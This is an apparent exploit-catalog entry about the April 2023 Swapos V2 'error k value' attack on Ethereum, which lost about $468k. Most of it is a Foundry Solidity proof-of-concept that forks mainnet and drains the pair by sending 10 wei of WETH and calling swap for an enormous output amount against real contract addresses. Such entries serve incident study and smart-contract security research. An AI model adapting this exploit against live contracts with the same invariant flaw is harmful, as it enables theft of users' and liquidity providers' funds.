# [?] Swapos V2 - error k value Attack

## Summary
Severity: Unknown
Chain: Ethereum
Component: Swapos
Published: 2023-04-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Swapos_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$468k
References:
- https://twitter.com/CertiKAlert/status/1647530789947469825
- https://twitter.com/BeosinAlert/status/1647552192243728385
- https://etherscan.io/address/0x2df07c054138bf29348f35a12a22550230bd1405

```solidity
contract ContractTest is Test {
    SWAPOS swpToken = SWAPOS(0x09176F68003c06F190ECdF40890E3324a9589557);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    SWAPOS swapPos = SWAPOS(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_057_419);
        cheats.label(address(WETH), "weth");
        cheats.label(address(swpToken), "swpToken");
    }

    function testExploit() external {
        WETH.deposit{value: 3 ether}();
        WETH.transfer(address(swapPos), 10);
        swapPos.swap(142_658_161_144_708_222_114_663, 0, address(this), "");
        (uint256 _reserve0, uint256 _reserve1, uint32 _blockTimestampLast) = swapPos.getReserves();
        emit log_named_decimal_uint("swapos balance", _reserve0, 18);
        emit log_named_decimal_uint("ETH balance", _reserve1, 18);
    }
}
```
